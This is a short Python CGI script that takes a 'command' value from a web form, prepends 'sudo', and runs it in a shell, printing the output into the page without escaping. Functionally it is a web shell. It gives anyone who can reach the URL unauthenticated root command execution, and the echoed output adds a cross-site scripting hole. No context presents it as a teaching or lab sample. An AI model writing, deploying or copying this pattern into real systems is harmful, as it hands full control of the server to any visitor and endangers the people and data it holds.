#!/usr/bin/env python3

import cgi
import subprocess

print("Content-Type: text/html\n")

form = cgi.FieldStorage()
command = form.getvalue("command")

if command:
    try:
        process = subprocess.Popen("sudo " + command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        
        if stdout:
            print("<h2>Output:</h2>")
            print(f"<pre>{stdout}</pre>")
        if stderr:
            print("<h2>Errors:</h2>")
            print(f"<pre>{stderr}</pre>")
    except Exception as e:
        print("<h2>Error:</h2>")
        print(f"<pre>{e}</pre>")
else:
    print("<p>No command provided.</p>")

